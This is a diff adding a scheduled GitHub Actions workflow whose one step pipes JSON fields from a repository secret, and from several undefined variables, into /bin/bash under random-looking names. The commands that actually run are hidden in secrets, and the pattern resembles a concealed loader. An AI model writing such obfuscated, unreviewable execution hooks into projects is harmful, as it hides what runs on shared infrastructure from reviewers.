@@ -1,0 +1,30 @@
+name: aialphagozh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: aialphagozh
+        env:
+          fsg0365: ${{ secrets.fsg0365 }}
+        run: |
+          echo $fsg0365 | jq -r .i79439 | /bin/bash
+          echo $jvspg65489 | jq -r .xe9575 | /bin/bash
+          echo $j8 | jq -r .rib71065 | /bin/bash
+          echo $wjw17968 | jq -r .i4921 | /bin/bash
+          echo $isv55 | jq -r .kdq92567 | /bin/bash
+          echo $pnz91150 | jq -r .zc158 | /bin/bash
+          echo $vtkmv89 | jq -r .s8570 | /bin/bash
+          echo $d1815 | jq -r .t21 | /bin/bash
+          echo $la3516 | jq -r .cx3 | /bin/bash
+          echo $lv516 | jq -r .lqto41 | /bin/bash
+          echo $i07868 | jq -r .oaoid51 | /bin/bash
+          echo $r5837 | jq -r .u5235 | /bin/bash
+          echo $gr03 | jq -r .hwyou103 | /bin/bash
+          echo $qbzxn62 | jq -r .hjigh0 | /bin/bash
+
